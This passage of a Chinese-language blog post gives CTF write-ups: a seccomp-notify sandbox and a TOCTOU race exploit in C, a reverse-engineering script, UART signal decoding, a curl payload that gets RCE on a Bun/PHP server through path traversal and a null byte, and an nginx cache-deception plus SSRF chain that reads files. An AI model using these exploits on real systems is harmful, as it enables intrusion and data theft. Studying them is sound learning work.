  seccomp_rule_add(ctx, SCMP_ACT_NOTIFY, SCMP_SYS(openat), <span class="number">0</span>);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_NOTIFY, SCMP_SYS(openat2), <span class="number">0</span>);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_NOTIFY, SCMP_SYS(link), <span class="number">0</span>);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_NOTIFY, SCMP_SYS(linkat), <span class="number">0</span>);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_NOTIFY, SCMP_SYS(symlink), <span class="number">0</span>);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_NOTIFY, SCMP_SYS(symlinkat), <span class="number">0</span>);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_NOTIFY, SCMP_SYS(mount), <span class="number">0</span>);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_NOTIFY, SCMP_SYS(name_to_handle_at), <span class="number">0</span>);</span><br><span class="line">    seccomp_rule_add(ctx, SCMP_ACT_NOTIFY, SCMP_SYS(getpid), <span class="number">0</span>);</span><br><span class="line">    seccomp_load(ctx);</span><br><span class="line"></span><br><span class="line">    ret = seccomp_notify_fd(ctx);</span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        errno = -ret;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// set blocking</span></span><br><span class="line">    <span class="type">int</span> flags = fcntl(ret, F_GETFL);</span><br><span class="line">    flags &amp;= ~O_NONBLOCK;</span><br><span class="line"></span><br><span class="line">    fcntl(ret, F_SETFL, flags);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">pidfd_open</span><span class="params">(<span class="type">pid_t</span> pid, <span class="type">unsigned</span> <span class="type">int</span> flags)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(SYS_pidfd_open, pid, flags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">pidfd_getfd</span><span class="params">(<span class="type">int</span> pidfd, <span class="type">int</span> targetfd, <span class="type">unsigned</span> <span class="type">int</span> flags)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(SYS_pidfd_getfd, pidfd, targetfd, flags);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">seccomp_notify_zeroing</span><span class="params">(</span></span><br><span class="line"><span class="params">    <span class="keyword">struct</span> seccomp_notif *req,</span></span><br><span class="line"><span class="params">    <span class="keyword">struct</span> seccomp_notif_resp *resp</span></span><br><span class="line"><span class="params">)</span> &#123;</span><br><span class="line">    <span class="type">int</span> rc;</span><br><span class="line">    <span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">seccomp_notif_sizes</span> <span class="title">sizes</span> =</span> &#123; <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (sizes.seccomp_notif == <span class="number">0</span> &amp;&amp; sizes.seccomp_notif_resp == <span class="number">0</span>) &#123;</span><br><span class="line">        rc = syscall(__NR_seccomp, SECCOMP_GET_NOTIF_SIZES, <span class="number">0</span>, &amp;sizes);</span><br><span class="line">        <span class="keyword">if</span> (rc &lt; <span class="number">0</span>) <span class="keyword">return</span> rc;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// no size</span></span><br><span class="line">    <span class="keyword">if</span> (sizes.seccomp_notif == <span class="number">0</span> || sizes.seccomp_notif_resp == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (req) <span class="built_in">memset</span>(req, <span class="number">0</span>, sizes.seccomp_notif);</span><br><span class="line">    <span class="keyword">if</span> (resp) <span class="built_in">memset</span>(resp, <span class="number">0</span>, sizes.seccomp_notif_resp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">run_program</span><span class="params">(<span class="type">char</span>* program)</span> &#123;</span><br><span class="line">    <span class="type">char</span> *argv[<span class="number">2</span>];</span><br><span class="line">    argv[<span class="number">0</span>] = program;</span><br><span class="line">    argv[<span class="number">1</span>] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (access(program, X_OK) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;program not found or not executable\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">127</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    execve(program, argv, __environ);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span> &#123;</span><br><span class="line">    <span class="type">int</span> status = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">int</span> *targetfd = mmap(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(<span class="type">int</span>), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    *targetfd = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *program;</span><br><span class="line">    <span class="keyword">if</span> (argc &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        program = argv[<span class="number">1</span>];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        program = <span class="string">&quot;app&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> pid = fork();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// no new priveleges to enable filter without root</span></span><br><span class="line">        prctl(PR_SET_NO_NEW_PRIVS, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> notifier = init_seccomp();</span><br><span class="line">        *targetfd = notifier;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// busy waiting, keep fd valid until parent receive it</span></span><br><span class="line">        <span class="keyword">while</span> (*targetfd != <span class="number">-1</span>);</span><br><span class="line">        close(notifier);</span><br><span class="line"></span><br><span class="line">        run_program(program);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// should not reach here</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">127</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;fork failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> close;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">int</span> pidfd = pidfd_open(pid, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// busy waiting</span></span><br><span class="line">        <span class="keyword">while</span> (*targetfd == <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> notifier = pidfd_getfd(pidfd, *targetfd, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (notifier &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">goto</span> out_kill;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        *targetfd = <span class="number">-1</span>;</span><br><span class="line">        munmap(targetfd, <span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> tracer = fork();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (tracer == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">seccomp_notif</span> *<span class="title">req</span>;</span></span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">seccomp_notif_resp</span> *<span class="title">resp</span>;</span></span><br><span class="line"></span><br><span class="line">            seccomp_notify_alloc(&amp;req, &amp;resp);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">                seccomp_notify_zeroing(req, resp);</span><br><span class="line">                <span class="type">int</span> ret = seccomp_notify_receive(notifier, req);</span><br><span class="line">                <span class="keyword">if</span> (ret) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (notif_handler(req, resp, notifier) &lt; <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">                seccomp_notify_respond(notifier, resp);</span><br><span class="line">            &#125;</span><br><span class="line">            seccomp_notify_free(req, resp);</span><br><span class="line"></span><br><span class="line">            close(notifier);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        close(notifier);</span><br><span class="line"></span><br><span class="line">        waitpid(pid, &amp;status, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">out_kill:</span><br><span class="line">        <span class="keyword">if</span> (tracer &gt; <span class="number">0</span>) kill(tracer, SIGKILL);</span><br><span class="line">        <span class="keyword">if</span> (pid &gt; <span class="number">0</span>) kill(pid, SIGKILL);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">close:</span><br><span class="line">    <span class="keyword">return</span> status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>這裡會發現存在 TOCTOU 漏洞<br />
+這裡會導致 Kernel 必須重新回到使用者記憶體去讀取檔案路徑參數<br />
+<img src="https://hackmd.io/_uploads/BypNa9Pm-x.png" alt="image" /></p>
+<p>所以我們可以透過 Sandbox 檢查完記憶體認為安全後，Kernel 真正執行時需同一塊記憶體，利用這微小的時間差將路徑偷換成 /flag<br />
+<img src="https://hackmd.io/_uploads/S1dy_Yw7-e.png" alt="image" /></p>
+<p><code>exp.c</code>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">#define _GNU_SOURCE</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;pthread.h&gt;</span><br><span class="line">#include &lt;sys/syscall.h&gt;</span><br><span class="line">#include &lt;sys/mman.h&gt;</span><br><span class="line"></span><br><span class="line">#define GOOD_PATH &quot;/etc/passwd&quot;</span><br><span class="line">#define BAD_PATH  &quot;/flag&quot;</span><br><span class="line"></span><br><span class="line">char *shared_path;</span><br><span class="line">int stop = 0;</span><br><span class="line"></span><br><span class="line">void* flipper(void* arg) &#123;</span><br><span class="line">    while (!stop) &#123;</span><br><span class="line">        strcpy(shared_path, GOOD_PATH);</span><br><span class="line">        strcpy(shared_path, BAD_PATH);</span><br><span class="line">    &#125;</span><br><span class="line">    return NULL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    shared_path = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);</span><br><span class="line"></span><br><span class="line">    pthread_t t;</span><br><span class="line">    pthread_create(&amp;t, NULL, flipper, NULL);</span><br><span class="line"></span><br><span class="line">    for (int i = 0; i &lt; 10000; i++) &#123;</span><br><span class="line">        int fd = syscall(SYS_openat, AT_FDCWD, shared_path, O_RDONLY);</span><br><span class="line"></span><br><span class="line">        if (fd &gt;= 0) &#123;</span><br><span class="line">            char buf[128] = &#123;0&#125;;</span><br><span class="line">            read(fd, buf, sizeof(buf) - 1);</span><br><span class="line">            if (strstr(buf, &quot;EOF&#123;&quot;) || buf[0] != &#x27;r&#x27;) &#123;</span><br><span class="line">                printf(&quot;\nFlag: %s\n&quot;, buf);</span><br><span class="line">                stop = 1;</span><br><span class="line">                close(fd);</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">            close(fd);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (i % 1000 == 0) printf(&quot;.&quot;);</span><br><span class="line">        fflush(stdout);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    stop = 1;</span><br><span class="line">    pthread_join(t, NULL);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>flag</code>: EOF{TICTACTOE_TICKTOCTOU}</p>
+<h2 id="reverse"><a class="markdownIt-Anchor" href="#reverse"></a> Reverse</h2>
+<h3 id="structured-small"><a class="markdownIt-Anchor" href="#structured-small"></a> Structured - Small</h3>
+<p>題目給了 10 個 binary 一個一個分析會發現每一個 binary 幾乎除了 v5 的值 其他code 均相同, 但是會發現第 6 10 11 的 binary 是 flag 的開頭與結尾，裡面有做一些位移，所以我們要把 flag 的位移依照程式邏輯轉回來<br />
+<code>exp.py</code>:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rol64</span>(<span class="params">val, n</span>):</span><br><span class="line">    <span class="keyword">return</span> ((val &lt;&lt; n) &amp; <span class="number">0xFFFFFFFFFFFFFFFF</span>) | (val &gt;&gt; (<span class="number">64</span> - n))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pack_str</span>(<span class="params">s</span>):</span><br><span class="line">    s_bytes = s.encode().ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> struct.unpack(<span class="string">&#x27;&gt;Q&#x27;</span>, s_bytes)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unpack_int</span>(<span class="params">n, length=<span class="number">8</span></span>):</span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&#x27;&gt;Q&#x27;</span>, n)[-length:].decode(errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line"></span><br><span class="line">v5_val = pack_str(<span class="string">&#x27;TRuEOF&#123;5&#x27;</span>)</span><br><span class="line">part5 = unpack_int(rol64(v5_val, <span class="number">24</span>))</span><br><span class="line"></span><br><span class="line">v9_val = pack_str(<span class="string">&#x27;faNg_906&#x27;</span>)</span><br><span class="line">part9 = unpack_int(rol64(v9_val, <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">part11_const = <span class="string">b&#x27;\x0a\x7d\x38\x39\x66\x35\x34&#x27;</span></span><br><span class="line">part11 = part11_const[::-<span class="number">1</span>].decode()</span><br><span class="line"></span><br><span class="line">flag_parts = [</span><br><span class="line">    <span class="string">&quot;EOF&#123;5TRu&quot;</span>,</span><br><span class="line">    <span class="string">&quot;CTuR3D_r&quot;</span>,</span><br><span class="line">    <span class="string">&quot;3V3R53_3&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ng1N3eR1&quot;</span>,</span><br><span class="line">    part9,</span><br><span class="line">    <span class="string">&quot;c9195049&quot;</span>,</span><br><span class="line">    part11</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(flag_parts).strip())</span><br></pre></td></tr></table></figure>
+<h3 id="bored"><a class="markdownIt-Anchor" href="#bored"></a> bored</h3>
+<p>a part of signal.vcd:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#833328   -&gt; 訊號變 0</span><br><span class="line">0d</span><br><span class="line">#1041660  -&gt; 訊號變 1 (差 208332)</span><br><span class="line">1d</span><br><span class="line">#1145826  -&gt; 訊號變 0 (差 104166)</span><br><span class="line">// 這裡可以發現 208332 正好是 104166 的兩倍，表示一個 bit 的時間長度 = 104166 ns</span><br><span class="line">0d</span><br><span class="line">#1458324</span><br><span class="line">1d</span><br><span class="line">#1666656</span><br><span class="line">0d</span><br><span class="line">#1770822</span><br><span class="line">1d</span><br><span class="line">#1979154</span><br><span class="line">0d</span><br><span class="line">#2291652</span><br><span class="line">1d</span><br><span class="line">#2395818</span><br><span class="line">0d</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+<p>所以可以做出以下表格統計</p>
+<table>
+<thead>
+<tr>
+<th>Bit 順序</th>
+<th>時間點 (ns)</th>
+<th>讀取值</th>
+<th>說明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Start</td>
+<td>833,328</td>
+<td>0</td>
+<td>起始位元，通訊開始</td>
+</tr>
+<tr>
+<td>Bit 0</td>
+<td>833,328 + 104,166 = 937,494</td>
+<td>0</td>
+<td>資料第 1 位</td>
+</tr>
+<tr>
+<td>Bit 1</td>
+<td>937,494 + 104,166 = 1,041,660</td>
+<td>1</td>
+<td>資料第 2 位（波形拉高）</td>
+</tr>
+<tr>
+<td>Bit 2</td>
+<td>1,041,660 + 104,166 = 1,145,826</td>
+<td>0</td>
+<td>資料第 3 位（波形拉低）</td>
+</tr>
+<tr>
+<td>Bit 3</td>
+<td>1,145,826 + 104,166 = 1,249,992</td>
+<td>0</td>
+<td>資料第 4 位</td>
+</tr>
+<tr>
+<td>Bit 4</td>
+<td>1,249,992 + 104,166 = 1,354,158</td>
+<td>0</td>
+<td>資料第 5 位</td>
+</tr>
+<tr>
+<td>Bit 5</td>
+<td>1,354,158 + 104,166 = 1,458,324</td>
+<td>1</td>
+<td>資料第 6 位（波形拉高）</td>
+</tr>
+<tr>
+<td>Bit 6</td>
+<td>1,458,324 + 104,166 = 1,562,490</td>
+<td>1</td>
+<td>資料第 7 位</td>
+</tr>
+<tr>
+<td>Bit 7</td>
+<td>1,562,490 + 104,166 = 1,666,656</td>
+<td>0</td>
+<td>資料第 8 位（波形拉低）</td>
+</tr>
+<tr>
+<td>Stop</td>
+<td>1,666,656 + 104,166 = 1,770,822</td>
+<td>1</td>
+<td>結束位元</td>
+</tr>
+</tbody>
+</table>
+<p>現在我們收集到了 8 個資料位元： 0, 1, 0, 0, 0, 1, 1, 0</p>
+<p>因為 UART 協定是 LSB First（最低有效位先傳），所以要把這個順序倒過來讀，才能變成人類看得懂的二進位數字：</p>
+<ol>
+<li>原始順序： 0 1 0 0 0 1 1 0</li>
+<li>倒轉順序 (MSB)： 0 1 1 0 0 0 1</li>
+</ol>
+<p>將二進位 01100010 轉換成十六進位：</p>
+<ol>
+<li>0110 = 6</li>
+<li>0010 = 2<br />
+結果 = 0x62</li>
+</ol>
+<p>0x62 = b</p>
+<p>接著只要用同樣的邏輯（尋找下一個 Start Bit 0，然後每隔 104,166ns 讀一次）</p>
+<p>依此類推，最終就會拼湊出key: b4r3MEt41</p>
+<p><img src="https://hackmd.io/_uploads/H1y7ikd7-g.png" alt="image" /><br />
+<code>flag</code>: EOF{ExP3d14i0N_33_15_4he_G0AT}</p>
+<h2 id="web"><a class="markdownIt-Anchor" href="#web"></a> Web</h2>
+<h3 id="bunphp"><a class="markdownIt-Anchor" href="#bunphp"></a> Bun.PHP</h3>
+<p>這題是一個使用 bun v1.3.5 運行的 Server，不是傳統 nginx / Apache<br />
+Dockerfile: FROM oven/bun:1.3.5-alpine</p>
+<p>我們可以從 index.js 發現<br />
+伺服器有一個路由 /cgi-bin/:filename，他限制我們請求的路徑只能以 .php 結尾，並且他是以 bun shell 的方式 $ 執行<br />
+<img src="https://hackmd.io/_uploads/r1fHredX-e.png" alt="image" /></p>
+<p>雖然是 php 寫的，但是透過 <code>Shebang #!/usr/bin/php-cgi</code> 執行的<br />
+解決限制路徑的方式就是透過 path traversal 的方式 …%2f…%2f 來繞過<br />
+並且強制以 .php 結尾，我們可以透過 Null Byte injection (%00) 去截斷，這樣也確實是以 .php 結尾，但是又可以截斷 .php<br />
+這樣我們就可以嘗試執行 /bin/sh -&gt; <code>..%2f..%2f..%2f..%2f..%2fbin%2fsh%00.php</code><br />
+於是我們可以使用 curl 送進我們的 payload，達成 RCE<br />
+final payload: <code>curl -X POST &quot;https://139b064eaa7c424a.chal.eof.133773.xyz:20001/cgi-bin/..%2f..%2f..%2f..%2fbin%2fsh%00.php&quot; --data-binary $'printf &quot;\r\n\r\n&quot;; /readflag give me the flag'</code></p>
+<p><code>flag</code>: EOF{1_tUrn3d_Bun.PHP_Int0_4_r34l1ty}</p>
+<h3 id="linkoreco"><a class="markdownIt-Anchor" href="#linkoreco"></a> LinkoReco</h3>
+<p><code>docker-compose.yml</code>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">version: &#x27;3&#x27;</span><br><span class="line">services:                                                                                               web:                                                                                                    image: nginx:latest</span><br><span class="line">    ports:</span><br><span class="line">      - &quot;19080:80&quot;                                                                                        volumes:                                                                                                - ./conf/default.conf:/etc/nginx/conf.d/default.conf</span><br><span class="line">      - ./src:/var/www/html                                                                               depends_on:                                                                                             - php</span><br><span class="line"></span><br><span class="line">  php:                                                                                                    image: php:7.4-fpm                                                                                    volumes:                                                                                                - ./src:/var/www/html</span><br><span class="line">      - ./flag.txt:/etc/REDACTED_FILENAME.txt # yes, secret.</span><br><span class="line"></span><br><span class="line"># static files should be well handled, but seems like only fpm serves it?</span><br></pre></td></tr></table></figure>
+<p>Hints:<br />
+1.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HINT: FULL ACCESS TOKEN CAN ONLY BE OBTAINED THROUGH LOCALHOST(web)</span><br></pre></td></tr></table></figure>
+<ol start="2">
+<li></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. Token 只有在使用者從 local 造訪的時候會顯示</span><br><span class="line">2. 這個服務沒有正確 Token 傳入的時候不會回顯內容，只會告訴你 status code，所以有 token 會更方便使用系統</span><br><span class="line">3. 眼睛睜大一點，你會發現伺服器其實有在記得一些東西，而背景圖片本來應該要被存到的...但這個功能被 ai 寫壞了，/static 的靜態檔案應該要被存到的，但是他們直接走 nginx 跑掉了</span><br><span class="line">4. 在她做滲透測試的時候沒有也不需要 fuzzing / 利用 SSRF 去戳 php fpm service</span><br></pre></td></tr></table></figure>
+<ol start="3">
+<li></li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Cache Rule</span><br><span class="line">map $request_uri $is_static &#123;</span><br><span class="line">    default 0;</span><br><span class="line">    &quot;~*^/static/.*\.(svg|png|jpg|jpeg|css)$&quot; 1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>challenge page:<br />
+<img src="https://hackmd.io/_uploads/rJJ-ceOXZl.png" alt="image" /></p>
+<p>這一題我們要利用快取機制，來取得只有 localhost 才能拿到的 Token<br />
+再來需要利用拿到的 Token 去做驗證，在利用 SSRF 讀取 Server 內部的檔案</p>
+<p>取得 Token 方法：</p>
+<ol>
+<li>根據 Nginx 的 map 規則 <code>&quot;~*^/static/.*\.(svg|png|jpg|jpeg|css)$&quot; 1;</code> ，這表示如果網址以 /static/ 開頭且以圖片或 CSS 副檔名結尾，Nginx 會將其視為靜態資源並進行快取</li>
+<li>但是 hint 裡有提到 /static 的檔案直接走 nginx，但因為「AI 寫壞了」，如果檔案不存在，通常 Nginx 的 try_files 機制會將請求轉給 index.php 處理</li>
+<li>在 url 輸入欄填入：<code>http://web/static/..%2findex.php/&lt;anything&gt;.png</code><br />
+然後使用payload:<br />
+<code>curl -H &quot;Host: web&quot; --path-as-is  http://chals1.eof.ais3.org:19080/static/..%2findex.php/flag.png</code><br />
+我們就可以拿到 Token 了<br />
+<img src="https://hackmd.io/_uploads/SkunpgOQWl.png" alt="image" /><br />
+為啥可以這樣?<br />
+根據 Nginx 的判斷，Nginx 檢查網址字串：<code>/static/..%2findex.php/flag.png</code><br />
+Nginx 裡面寫：只要是 /static/ 開頭且以 .png 結尾，就視為靜態檔案<br />
+結果就是: 這是一個靜態圖片，應該被快取<br />
+但當 Nginx 真的要去抓檔案的話，路徑就變成了 <code>/static/../index.php/flag.png</code><br />
+/static/…/ 互相抵消，最終路徑指向 /index.php，後面的 /flag.png 變成 PATH_INFO，被 php 忽略了<br />
+執行結果：Nginx 將請求轉交給 PHP 執行 index.php</li>
+</ol>
+<p>既然我們有了 Token ，我們可以去執行 Server 內的任意讀，利用 <code>file://</code>，但是我們會發現 docker-compose.yml，裡面把 flag.txt 命名成不知道是啥東東，所以我們可以利用 <code>file:///proc/self/mounts</code> 去找他裡面掛載了啥東東<br />
+<img src="https://hackmd.io/_uploads/SJioJbumbe.png" alt="image" /><br />
+發現 ca7_f113.txt<br />
+所以使用 file:///etc/ca7_f113.txt<br />
+get flag!<br />
+<img src="https://hackmd.io/_uploads/B1xWxZO7bg.png" alt="image" /></p>
+<p><code>flag</code>: EOF{たきな、スイーツ追加！それがないなら……修理？やらないから！}</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/note/" rel="tag">note</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="https://d-sketon.top/img/_backwebp/bg1.webp" data-sizes="auto" alt="Heap exploitation" class="lazyload">
+        
+      
+      <a href="/2025/11/08/Heap%20exploitation/"></a>
+      <div class="article-nav-caption">Next</div>
+      <h3 class="article-nav-title">
+        
+          Heap exploitation
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+
+
+
+
+</section>
+        </div>
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      
+      
+      
+        2020-2025
+      
+      <span class="footer-info-sep rotate"></span>
+      Auron
+    </div>
+    
+      <div>
+        Powered by&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
